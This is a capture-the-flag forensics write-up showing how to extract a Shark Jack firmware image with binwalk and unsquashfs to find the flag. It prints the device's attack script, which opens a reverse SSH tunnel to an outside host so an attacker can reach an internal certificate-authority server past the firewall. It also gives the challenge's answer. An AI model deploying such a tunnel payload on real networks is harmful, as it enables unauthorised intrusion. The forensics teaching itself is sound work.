# Controlled Access

## Forensics: Points 50

## Solve
We've been asked to help a certificate authority figure out what a [device](https://shop.hak5.org/products/shark-jack) they found plugged into their network was doing. They were able to dump the [firmware.bin](./firmware.bin) and would like to know if it allowed the attacker to connect to any devices that their firewall (which blocks inbound SSH) would have stopped. Their internal domain uses 'digisigner.local' for DNS host names. The flag is the hostname of the *internal* host that the hacker targeted (i.e. ACI{[local hostname targeted]}).

## Hints
* A tool like [binwalk](https://github.com/ReFirmLabs/binwalk) might be useful for inspecting the firmware.
* The [documentation](https://docs.hak5.org/hc/en-us/categories/360002117973-Shark-Jack) mentions that the 'attack' payload for this device lives in a very particular spot on the filesystem...

## Solution
Install binwalk.
```
$ sudo python3 setup.py install
```
Run binwalk on the firmware file.
```
$ binwalk firmware.bin
```

Binwalk lists a few symbols contained in the firmware:
```
DECIMAL       HEXADECIMAL     DESCRIPTION
------------------------------------------------------------------
0             0x0             uImage header, header size: 64 [...]
64            0x40            LZMA compressed data, properties: [...]
1467904       0x166600        Squashfs filesystem, little endian [...]
```

One of the symbols is **Squashfs filesystem**, which starts at offset 1467904. This is important for the next step.

The squashfs filesystem needs to be isolated so that it can be investigated further. `dd` is a command-line utility for Unix operating systems whose primary purpose is to convert and copy files. `dd` can be used to copy the squashfs section to a separate file.

```
$ dd if=firmware.bin skip=1467904 bs=1 of=sharkjack.sqfs
```

In the command above, `if` stands for input file, `skip` is the number of bytes to skip (skip to the start of the squashfs filesystem), `bs` stands for byte size, and `of` stands for output file.

Next, unsquash the file system so that it is readable.

```
$ sudo unsquashfs sharkjack.sqfs
```

From here, the file system is extracted to a folder called **squashfs-root**.

The [Shark Jack Directory Structure page][1] shows that the payload exists in **/root/payload/**:

```
Directory Structure
/root/loot/ – home to log files and other loot stored by payloads
/root/payload/ – home to the payload which will execute when the switch is flipped to the Attack mode
/tmp/ – volatile memory for temporary storage during payload execution
```

Open the **payload** directory:

```
$ cd squashfs-root/root/payload/
$ ls
payload.sh
```

Open the **payload.<span>sh** file:

```
$ cat payload.sh 
#!/bin/bash
#
# Title:         Secure Shark Jacker
# Author:        Mr. Robot
# Version:       13.37
#
INTERNAL_HOST=rootca.digisigner.local
INTERNAL_PORT=22

function run() {
    ssh -R localhost:31337:$INTERNAL_HOST:$INTERNAL_PORT garyhost@10.57.1.7
}

# Run payload
run &
```

The challenge states:
> The flag is the hostname of the *internal* host that the hacker targeted (i.e. ACI{[local hostname targeted]}).

Examine the `INTERNAL_HOST` required for the flag:

```
INTERNAL_HOST=rootca.digisigner.local
```
Plug this into the flag format and submit
```
ACI{rootca.digisigner.local}
```

## Resources
* [Poking around router firmware using Binwalk](https://www.youtube.com/watch?v=46tEIFAp7gc)
* [SharkJack Directory Structure][1]

[1]:https://docs.hak5.org/hc/en-us/articles/360034130934-Directory-Structure